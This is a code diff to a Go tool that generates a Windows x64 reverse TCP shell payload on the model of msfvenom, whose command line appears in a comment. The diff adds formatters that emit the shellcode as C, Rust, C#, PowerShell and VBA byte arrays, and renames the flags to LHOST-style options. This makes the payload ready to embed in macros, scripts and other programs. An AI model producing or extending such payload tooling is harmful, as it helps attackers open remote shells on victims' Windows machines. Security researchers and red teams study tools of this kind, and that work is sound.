@@ -66,10 +66,62 @@ func parseIPv4(ipStr string) ([4]byte, error) {
 	return ip, nil
 }
 
+func formatC(buf []byte) string {
+	var sb strings.Builder
+	sb.WriteString("unsigned char buf[] = {")
+	for _, b := range buf {
+		sb.WriteString(fmt.Sprintf("0x%02x, ", b))
+	}
+	sb.WriteString("};")
+	return sb.String()
+}
+
+func formatRust(buf []byte) string {
+	var sb strings.Builder
+	sb.WriteString("let buf: [u8; ")
+	sb.WriteString(fmt.Sprintf("%d", len(buf)))
+	sb.WriteString("] = [")
+	for _, b := range buf {
+		sb.WriteString(fmt.Sprintf("0x%02x, ", b))
+	}
+	sb.WriteString("];")
+	return sb.String()
+}
+
+func formatCSharp(buf []byte) string {
+	var sb strings.Builder
+	sb.WriteString("byte[] buf = new byte[] {")
+	for _, b := range buf {
+		sb.WriteString(fmt.Sprintf("0x%02x, ", b))
+	}
+	sb.WriteString("};")
+	return sb.String()
+}
+
+func formatVBA(buf []byte) string {
+	var sb strings.Builder
+	sb.WriteString("Dim buf() As Byte\nbuf = Array(")
+	for _, b := range buf {
+		sb.WriteString(fmt.Sprintf("&H%02x, ", b))
+	}
+	sb.WriteString(")")
+	return sb.String()
+}
+
+func formatPowerShell(buf []byte) string {
+	var sb strings.Builder
+	sb.WriteString("$buf = @(")
+	for _, b := range buf {
+		sb.WriteString(fmt.Sprintf("0x%02x, ", b))
+	}
+	sb.WriteString(")")
+	return sb.String()
+}
+
 func main() {
-	flag.StringVar(&host, "host", "127.0.0.1", "Host IP address")
-	flag.IntVar(&port, "port", 4444, "Port number (0-65535)")
-	flag.StringVar(&format, "format", "raw", "Format: {raw, hex, base64}")
+	flag.StringVar(&host, "l", "127.0.0.1", "LHOST IP address")
+	flag.IntVar(&port, "p", 4444, "Port number (0-65535)")
+	flag.StringVar(&format, "f", "raw", `Formats: {raw, hex, base64, c, rust, csharp, psh, vba}`)
 	flag.Parse()
 
 	// msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f go
@@ -137,6 +189,18 @@ func main() {
 		fmt.Print(hex.EncodeToString(buf))
 	case "base64":
 		fmt.Print(base64.StdEncoding.EncodeToString(buf))
+	case "c":
+		fmt.Print(formatC(buf))
+	case "rust":
+		fmt.Print(formatRust(buf))
+	case "csharp":
+		fmt.Print(formatCSharp(buf))
+	case "psh":
+		fmt.Print(formatPowerShell(buf))
+	case "vba":
+		fmt.Print(formatVBA(buf))
+	case "raw":
+		fmt.Print(string(buf))
 	default:
 		fmt.Print(string(buf))
 	}
